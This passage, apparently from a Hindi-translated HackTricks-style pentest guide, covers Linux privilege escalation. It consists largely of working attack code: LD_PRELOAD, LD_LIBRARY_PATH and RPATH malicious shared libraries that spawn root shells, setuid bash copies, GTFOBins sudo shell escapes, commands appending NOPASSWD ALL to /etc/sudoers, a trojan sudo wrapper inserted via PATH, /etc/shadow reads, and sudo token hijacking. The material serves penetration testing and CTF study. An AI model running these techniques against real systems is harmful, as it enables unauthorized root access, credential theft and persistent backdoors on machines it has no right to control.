## Containerd (ctr) privilege escalation

यदि आपको पता चले कि आप **`ctr`** command का उपयोग कर सकते हैं, तो निम्न पेज पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

यदि आपको पता चले कि आप **`runc`** command का उपयोग कर सकते हैं तो निम्न पेज पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक उन्नत **inter-Process Communication (IPC) system** है जो applications को प्रभावी ढंग से interact और data share करने में सक्षम बनाता है। यह आधुनिक Linux सिस्टम को ध्यान में रखकर डिज़ाइन किया गया है और applications के बीच विभिन्न प्रकार के communication के लिए एक मजबूत framework प्रदान करता है।

System बहुमुखी है, यह basic IPC को सपोर्ट करता है जो processes के बीच data विनिमय को बेहतर बनाता है, जो **enhanced UNIX domain sockets** की तरह है। इसके अलावा, यह events या signals के broadcast में मदद करता है, जिससे system components के बीच seamless integration होता है। उदाहरण के लिए, एक Bluetooth daemon से incoming call के बारे में signal एक music player को mute करने के लिए प्रेरित कर सकता है, जिससे user experience बेहतर होता है। अतिरिक्त रूप से, D-Bus एक remote object system को सपोर्ट करता है, जो applications के बीच service requests और method invocations को सरल बनाता है, और परंपरागत रूप से जटिल प्रक्रियाओं को streamline करता है।

D-Bus एक **allow/deny model** पर काम करता है, और message permissions (method calls, signal emissions, आदि) को matching policy rules के cumulative प्रभाव के आधार पर manage करता है। ये policies bus के साथ interactions को निर्दिष्ट करती हैं, और इन permissions के exploitation के माध्यम से संभावित रूप से privilege escalation की अनुमति दे सकती हैं।

ऐसी एक policy का उदाहरण `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है, जो root user के लिए `fi.w1.wpa_supplicant1` के मालिक होने, उससे संदेश भेजने और प्राप्त करने के permissions का विवरण देता है।

जिस नीति में user या group निर्दिष्ट नहीं होता वह सार्वत्रिक रूप से लागू होती है, जबकि "default" context policies उन सभी पर लागू होती हैं जो अन्य विशिष्ट नीतियों द्वारा कवर नहीं किए गए हैं।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ जानें कि कैसे एक D-Bus communication को enumerate और exploit किया जा सकता है:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **नेटवर्क**

नेटवर्क को enumerate करना और मशीन की स्थिति पता लगाना हमेशा दिलचस्प रहता है।

### सामान्य enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

हमेशा उन नेटवर्क सेवाओं की जाँच करें जो मशीन पर चल रही हैं और जिनके साथ आप उसे एक्सेस करने से पहले इंटरैक्ट नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

जाँचें कि क्या आप sniff traffic कर सकते हैं। अगर आप कर सकते हैं, तो आप कुछ credentials प्राप्त कर सकते हैं।
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

जांचें कि आप **who** हैं, आपके पास कौन से **privileges** हैं, सिस्टम में कौन से **users** हैं, कौन **login** कर सकते हैं और किनके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

कुछ Linux संस्करण एक बग से प्रभावित थे जो **UID > INT_MAX** वाले उपयोगकर्ताओं को escalate privileges करने की अनुमति देते हैं। अधिक जानकारी: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

जाँचें कि आप **किसी समूह के सदस्य** हैं जो आपको root privileges दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

यदि संभव हो तो जाँचें कि क्लिपबोर्ड में कुछ भी रोचक है या नहीं।
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आप **पर्यावरण का कोई भी पासवर्ड जानते हैं** तो उस पासवर्ड का उपयोग करके **प्रत्येक उपयोगकर्ता के रूप में लॉगिन करने का प्रयास करें**।

### Su Brute

यदि आप बहुत शोर करने से परवाह नहीं करते हैं और `su` तथा `timeout` बाइनरीज़ कंप्यूटर पर मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` पैरामीटर के साथ भी उपयोगकर्ताओं पर brute-force करने की कोशिश करता है।

## Writable PATH के दुरुपयोग

### $PATH

यदि आप पाते हैं कि आप $PATH के किसी फ़ोल्डर के अंदर **लिख सकते हैं**, तो आप किसी अलग उपयोगकर्ता (आदर्श रूप से root) द्वारा चलाए जाने वाले किसी कमांड के नाम से उस फ़ोल्डर के अंदर **backdoor बनाकर** privileges escalate कर सकते हैं, बशर्ते वह कमांड $PATH में आपके writable फ़ोल्डर से पहले किसी फ़ोल्डर से **लोड न हो**।

### SUDO और SUID

आपको sudo का उपयोग करके कुछ कमांड चलाने की अनुमति दी जा सकती है या उन पर suid बिट सेट हो सकता है। इसे जांचें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अप्रत्याशित कमांड्स आपको फाइलें पढ़ने और/या लिखने या यहाँ तक कि किसी कमांड को निष्पादित करने की अनुमति देती हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo कॉन्फ़िगरेशन किसी उपयोगकर्ता को बिना पासवर्ड जाने किसी कमांड को दूसरे उपयोगकर्ता के विशेषाधिकारों के साथ चलाने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `root` के रूप में `vim` चला सकता है; अब root directory में एक ssh key जोड़कर या `sh` कॉल करके shell प्राप्त करना बहुत आसान है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को किसी चीज़ को निष्पादित करते समय **set an environment variable** करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **based on HTB machine Admirer**, **कमज़ोर** था **PYTHONPATH hijacking** के प्रति, जिससे root के रूप में स्क्रिप्ट चलाते समय एक मनमाना python library लोड की जा सकती थी:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo निष्पादन बायपास करने वाले पथ

**कूदें** अन्य फ़ाइलें पढ़ने के लिए या **symlinks** का उपयोग करें। उदाहरण के लिए sudoers फ़ाइल में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
अगर एक **wildcard** का उपयोग किया जाता है (\*), तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**निवारक उपाय**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary जिसमें command path निर्दिष्ट नहीं है

यदि **sudo permission** किसी single command को **path निर्दिष्ट किए बिना** दिया गया है: _hacker10 ALL= (root) less_ , तो आप PATH variable बदलकर इसका exploit कर सकते हैं।
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक तब भी इस्तेमाल की जा सकती है अगर कोई **suid** binary **किसी दूसरे command को बिना उसका path बताये execute करता है (हमेशा _**strings**_ से किसी अजीब SUID binary की सामग्री की जाँच करें)**।

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary जिसमें command path दिया गया हो

अगर **suid** binary **किसी दूसरे command को उसका path specify करते हुए execute करता है**, तो आप उस command के नाम से एक फ़ंक्शन बना कर उसे **export** करने की कोशिश कर सकते हैं जो suid फ़ाइल कॉल कर रही है।

उदाहरण के लिए, अगर कोई suid binary _**/usr/sbin/service apache2 start**_ को कॉल करता है, तो आपको फ़ंक्शन बनाकर उसे export करने की कोशिश करनी होगी:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid बायनरी को कॉल करेंगे, यह फ़ंक्शन निष्पादित होगा

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable का उपयोग एक या अधिक shared libraries (.so फाइलें) निर्दिष्ट करने के लिए किया जाता है जिन्हें loader द्वारा अन्य सभी लाइब्रेरीज़ से पहले लोड किया जाता है, जिसमें standard C library (`libc.so`) भी शामिल है। इस प्रक्रिया को library को preloading कहा जाता है।

हालाँकि, सिस्टम सुरक्षा बनाए रखने और विशेष रूप से **suid/sgid** executables के साथ इस फीचर के दुरुपयोग को रोकने के लिए, सिस्टम कुछ शर्तें लागू करता है:

- loader उन executables के लिए **LD_PRELOAD** को नज़रअंदाज़ करता है जहाँ real user ID (_ruid_) और effective user ID (_euid_) मेल नहीं खाते।
- suid/sgid वाले executables के लिए, केवल standard paths में मौजूद और जो स्वयं suid/sgid हैं, वही लाइब्रेरीज़ preload की जाती हैं।

Privilege escalation तब हो सकता है जब आपके पास `sudo` के साथ कमांड चलाने की क्षमता हो और `sudo -l` के आउटपुट में **env_keep+=LD_PRELOAD** लिखा हो। यह कॉन्फ़िगरेशन **LD_PRELOAD** environment variable को `sudo` के साथ कमांड चलाते समय भी स्थायी और मान्य बने रहने देता है, जिससे संभावित रूप से उच्च अधिकारों के साथ arbitrary code का निष्पादन हो सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
इसे **/tmp/pe.c** के रूप में सहेजें
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **इसे संकलित करें** का उपयोग करके:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **escalate privileges** चलाएँ
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> एक समान privesc का दुरुपयोग किया जा सकता है यदि attacker **LD_LIBRARY_PATH** env variable को नियंत्रित करता है क्योंकि वह नियंत्रित करता है कि libraries किस path में खोजे जाएँगे।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब किसी ऐसी बाइनरी का सामना हो जो असामान्य लगे और उस पर **SUID** अनुमतियाँ हों, तो यह अच्छा अभ्यास है कि यह जाँचा जाए कि वह **.so** फ़ाइलें सही ढंग से लोड कर रहा है या नहीं। इसे निम्नलिखित कमांड चलाकर जाँचा जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि का सामना करने पर यह संभावित रूप से exploitation के लिए संकेत देता है।

इसे exploit करने के लिए, आगे एक C फ़ाइल बनाई जाएगी, जैसे _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित कोड होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह कोड, एक बार compiled और executed होने पर, file permissions को manipulate करके और elevated privileges के साथ एक shell execute करके privileges को elevate करने का उद्देश्य रखता है।

ऊपर दिए गए C file को एक shared object (.so) file में Compile करें:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंत में, प्रभावित SUID binary को चलाने से exploit ट्रिगर होना चाहिए, जिससे संभावित system compromise की अनुमति मिल सकती है।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID binary पाया है जो उस फ़ोल्डर से library लोड कर रहा है जिसमें हम लिख सकते हैं, तो आइए उस फ़ोल्डर में आवश्यक नाम के साथ library बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको इस तरह की कोई त्रुटि मिलती है
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix binaries की एक curated सूची है जिन्हें एक हमलावर स्थानीय सुरक्षा प्रतिबंधों को bypass करने के लिए exploit कर सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) वही है लेकिन उन मामलों के लिए जहाँ आप **only inject arguments** कर सकते हैं।

प्रोजेक्ट उन Unix binaries के legitimate functions को इकट्ठा करता है जिन्हें abuse करके restricted shells से बाहर निकलना, elevated privileges को escalate या maintain करना, files transfer करना, bind और reverse shells spawn करना, और अन्य post-exploitation tasks को आसान बनाना संभव होता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

यदि आप `sudo -l` को access कर सकते हैं तो आप टूल [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का उपयोग यह चेक करने के लिए कर सकते हैं कि क्या यह किसी sudo rule को exploit करने का तरीका ढूँढता है।

### Reusing Sudo Tokens

ऐसे मामलों में जहाँ आपके पास **sudo access** है लेकिन password नहीं है, आप privileges को escalate कर सकते हैं by **waiting for a sudo command execution and then hijacking the session token**।

Privileges escalate करने की requirements:

- आपके पास पहले से user "_sampleuser_" के रूप में एक shell होना चाहिए
- "_sampleuser_" ने **used `sudo`** करके पिछले **15mins** में कुछ execute किया होना चाहिए (डिफ़ॉल्ट रूप से यही sudo token की duration होती है जो हमें बिना password के `sudo` उपयोग करने देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` का आउटपुट 0 होना चाहिए
- `gdb` उपलब्ध होना चाहिए (आप इसे upload कर सकें)

(आप अस्थायी रूप से `ptrace_scope` को `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` से enable कर सकते हैं या स्थायी रूप से `/etc/sysctl.d/10-ptrace.conf` को modify करके `kernel.yama.ptrace_scope = 0` सेट कर सकते हैं)

यदि ये सभी requirements पूरी होती हैं, **आप नीचे दिए गए का उपयोग करके privileges escalate कर सकते हैं:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- यह **second exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा जो root के स्वामित्व वाला और setuid के साथ होगा
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- यह **तीसरा exploit** (`exploit_v3.sh`) **sudoers file बनाएगा** जो **sudo tokens को स्थायी बना देगा और सभी users को sudo उपयोग करने की अनुमति देगा**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास उस फ़ोल्डर में या फ़ोल्डर के अंदर बनाए गए किसी भी फ़ाइल पर **write permissions** हैं, तो आप बाइनरी [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके **create a sudo token for a user and PID** कर सकते हैं.\
उदाहरण के लिए, अगर आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और आपके पास उस user के रूप में PID 1234 वाला shell है, तो आप बिना password जाने **obtain sudo privileges** कर सकते हैं, ऐसा करके:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. ये फाइलें **डिफ़ॉल्ट रूप से केवल user root और group root द्वारा ही पढ़ी जा सकती हैं**.\
**यदि** आप इस फाइल को **पढ़** सकते हैं तो आप **कुछ दिलचस्प जानकारी प्राप्त कर सकते हैं**, और यदि आप किसी भी फाइल को **लिख** सकते हैं तो आप **escalate privileges** कर पाएंगे.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं तो आप इस अनुमति का दुरुपयोग कर सकते हैं।
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन permissions का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD के लिए `doas` जैसी `sudo` बाइनरी के कुछ विकल्प हैं; इसकी कॉन्फ़िगरेशन `/etc/doas.conf` पर चेक करना याद रखें।
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आपको पता है कि एक **user आमतौर पर किसी मशीन से कनेक्ट होकर `sudo` का उपयोग** करता है और आपने उस user context में एक `shell` हासिल कर लिया है, तो आप **एक नया sudo executable** बना सकते हैं जो पहले आपकी कोड को `root` के रूप में चलाएगा और फिर user का कमांड चलाएगा। फिर, user context का **$PATH** बदलें (उदाहरण के लिए नया path `.bash_profile` में जोड़कर) ताकि जब user `sudo` चलाए तो आपका sudo executable execute हो।

ध्यान दें कि यदि user किसी अलग shell (bash नहीं) का उपयोग करता है तो नया path जोड़ने के लिए आपको अन्य फ़ाइलें बदलनी होंगी। उदाहरण के लिए[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. आप एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में पा सकते हैं।

या कुछ इस तरह चलाकर:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## साझा लाइब्रेरी

### ld.so

फ़ाइल `/etc/ld.so.conf` यह दर्शाती है कि **loaded configurations files किस स्थान से हैं**। सामान्यतः, यह फ़ाइल निम्नलिखित path रखती है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` से कॉन्फ़िगरेशन फ़ाइलें पढ़ी जाएँगी। ये कॉन्फ़िगरेशन फ़ाइलें उन अन्य फ़ोल्डरों की ओर संकेत करती हैं जहाँ **लाइब्रेरीज़** खोजी जाएँगी। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **इसका मतलब है कि सिस्टम `/usr/local/lib` के अंदर लाइब्रेरीज़ की तलाश करेगा**।

यदि किसी कारणवश किसी उपयोगकर्ता के पास उपरोक्त में से किसी path पर write permissions हों: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर कोई फ़ाइल या `/etc/ld.so.conf.d/*.conf` में सूचीबद्ध किसी भी फ़ोल्डर पर, तो वह सिस्टम पर अधिक अधिकार प्राप्त कर सकता है.\
नीचे दिए गए पृष्ठ में देखें कि **इस misconfiguration का कैसे exploit किया जाए**:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`/var/tmp/flag15/` में lib कॉपी करने पर, यह प्रोग्राम द्वारा इस स्थान पर उपयोग किया जाएगा जैसा कि `RPATH` variable में निर्दिष्ट है।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में एक evil library बनाएं, `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` का उपयोग करके
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## क्षमताएँ

Linux capabilities किसी process को उपलब्ध root अनुमतियों का **एक उपसमुच्चय** प्रदान करती हैं। यह प्रभावी रूप से root की **अनुमतियों को छोटे और विशिष्ट इकाइयों में विभाजित** कर देता है। इन इकाइयों में से प्रत्येक को फिर स्वतंत्र रूप से processes को प्रदान किया जा सकता है। इस तरह पूर्ण अनुमतियों का सेट घटता है, जिससे exploitation का जोखिम कम हो जाता है।\
capabilities और उनके दुरुपयोग के बारे में अधिक जानने के लिए निम्न पृष्ठ पढ़ें:


{{#ref}}
linux-capabilities.md
{{#endref}}

## निर्देशिका अनुमतियाँ

किसी निर्देशिका में, **"execute" बिट** का अर्थ है कि प्रभावित उपयोगकर्ता फ़ोल्डर में "**cd**" कर सकता है।\
**"read"** बिट का अर्थ है कि उपयोगकर्ता फ़ाइलों को **list** कर सकता है, और **"write"** बिट का अर्थ है कि उपयोगकर्ता नई **files** बना सकता है और मौजूद **files** को **delete** कर सकता है।

## ACLs

Access Control Lists (ACLs) विवेकाधीन अनुमतियों की द्वितीयक परत का प्रतिनिधित्व करती हैं, जो पारंपरिक ugo/rwx अनुमतियों को **override** करने में सक्षम होती हैं। ये अनुमतियाँ फ़ाइल या निर्देशिका तक पहुँच पर नियंत्रण बढ़ाती हैं क्योंकि ये उन विशिष्ट उपयोगकर्ताओं को अधिकार देने या अस्वीकार करने की अनुमति देती हैं जो मालिक या समूह का हिस्सा नहीं हैं। यह स्तर अधिक **सूक्ष्मता सुनिश्चित करता है जिससे अधिक सटीक access management संभव होता है**। आगे के विवरण के लिए देखें [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**दें** user "kali" को किसी फ़ाइल पर read और write permissions:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**पाएं** सिस्टम से विशिष्ट ACLs वाली फ़ाइलें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## खुले shell sessions

**पुराने संस्करणों** में आप किसी दूसरे उपयोगकर्ता (**root**) के कुछ **shell** session को **hijack** कर सकते हैं.\
**नवीनतम संस्करणों** में आप केवल **अपने ही उपयोगकर्ता** के screen sessions में **कनेक्ट** कर पाएंगे। हालांकि, आप **session के अंदर दिलचस्प जानकारी** पा सकते हैं।

### screen sessions hijacking

**screen sessions की सूची**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**session से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह समस्या **पुराने tmux संस्करणों** के साथ थी। मैं एक non-privileged user के रूप में root द्वारा बनाई गई tmux (v2.1) session को hijack नहीं कर पाया।

**tmux sessions सूची करें**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**session से जुड़ें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
यह बग उन OS में नया ssh key बनाते समय होता है, क्योंकि **केवल 32,768 variations संभव थीं**। इसका मतलब है कि सभी संभावनाओं की गणना की जा सकती है और **ssh public key होने पर आप संबंधित private key को खोज सकते हैं**। आप यहां गणना की गई संभावनाएँ पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
- **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
- **PermitEmptyPasswords**: जब password authentication की अनुमति हो, यह बताता है कि सर्वर खाली password strings वाले अकाउंट्स में लॉगिन की अनुमति देता है या नहीं। डिफ़ॉल्ट `no` है।

### PermitRootLogin

Specifies whether root can log in using ssh, default is `no`. Possible values:

- `yes`: root पासवर्ड और private key दोनों से लॉगिन कर सकता है
- `without-password` or `prohibit-password`: root केवल private key से ही लॉगिन कर सकता है
- `forced-commands-only`: root केवल private key का उपयोग करके और जब commands विकल्प निर्दिष्ट हों ही लॉगिन कर सकता है
- `no` : नहीं

### AuthorizedKeysFile

Specifies files that contain the public keys that can be used for user authentication. It can contain tokens like `%h`, which will be replaced by the home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको **use your local SSH keys instead of leaving keys** (without passphrases!) अपने server पर छोड़ने के बजाय इस्तेमाल करने की अनुमति देता है। इसलिए, आप ssh के जरिए एक **host** पर **jump** कर पाएँगे और वहां से दूसरे **host** पर **jump to another** कर सकेंगे, अपने **initial host** में मौजूद **key** का **using** करते हुए।

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि यदि `Host` `*` है, तो हर बार जब उपयोगकर्ता किसी दूसरी मशीन पर जाता है, वह host keys तक पहुँच सकेगा (जो एक सुरक्षा समस्या है)।

